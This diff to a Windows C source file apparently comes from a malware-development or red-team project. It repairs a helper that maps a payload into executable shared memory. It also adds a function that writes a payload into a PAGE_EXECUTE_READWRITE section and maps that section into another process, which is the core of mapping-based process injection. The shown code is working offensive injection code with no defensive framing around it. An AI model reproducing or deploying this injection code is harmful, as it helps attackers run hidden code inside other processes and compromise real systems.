@@ -646,36 +646,68 @@ BOOLEAN MapLocalMemory
 (
 	IN     PUCHAR  pPayload,
 	   OUT PUCHAR *pMappedAddress,
-	   OUT SIZE_T  sPayloadSize,
+	IN     SIZE_T  sPayloadSize,
 	   OUT PHANDLE phFileMappingHandle 
 )
 {
 	if (!phFileMappingHandle) return FALSE;
 	
 	BOOLEAN bState = FALSE;
-	
-	PUCHAR pMappingAddress;
-	
 
-	HANDLE hFile = CreateFileMappingW(
+	HANDLE hFile;
+	if (!(hFile = CreateFileMappingW(
 		INVALID_HANDLE_VALUE,
 		NULL,
-		PAGE_EXECUTE_WRITECOPY,
+		PAGE_EXECUTE_READWRITE,
 		NULL,
 		sPayloadSize,
 		NULL
-	);
+	)))return bState;
 
-	if(!(pMappingAddress = MapViewOFFile(
-		hFile, 
+	PUCHAR pMappingAddress = MapViewOfFile(
+		hFile,
 		FILE_MAP_WRITE | FILE_MAP_EXECUTE,
-		NULL, NULL, 
+		NULL, NULL,
 		sPayloadSize
-	))) goto cleanup;
+	);
+	if (!pMappingAddress) goto cleanup;
 	
 	if(!memcpy(pMappingAddress, pPayload, sPayloadSize)) return FALSE;
-	cleanup:
+
+	bState = TRUE;
+cleanup:
 	if (hFile) CloseHandle(hFile);
-	*pMappedAddress = phFileMappingHandle;
+	*pMappedAddress = pMappingAddress;
+	return bState;
+}
+
+BOOLEAN InjectPayloadRemoteMappedMemory
+(
+	IN     PUCHAR  pPayload,
+	   OUT PUCHAR *pRemoteMappedAddress,
+	   OUT PUCHAR *pLocalMappedAddress,
+	IN	   SIZE_T  sPayloadSize,
+	   OUT PHANDLE phRemoteFileMappingHandle,
+	IN     HANDLE  hProcess
+)
+{
+	if (!pPayload || !pRemoteMappedAddress || !sPayloadSize || !phRemoteFileMappingHandle) return FALSE;
+		
+	
+	PVOID pMapLocalAddress = NULL, pMapRemoteAddress = NULL;
+
+	if (!(*phRemoteFileMappingHandle = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL))) return FALSE;
+
+	if (!(pMapLocalAddress = MapViewOfFile(*phRemoteFileMappingHandle, FILE_MAP_WRITE, NULL, NULL, sPayloadSize))) return FALSE;
+
+	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
+	
+	if (!(pMapRemoteAddress = MapViewOfFile2(*phRemoteFileMappingHandle, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE))) return FALSE;
+
+	*pLocalMappedAddress = pMapLocalAddress;
+	*pRemoteMappedAddress = pMapRemoteAddress;
+
 	return TRUE;
 }
+
+
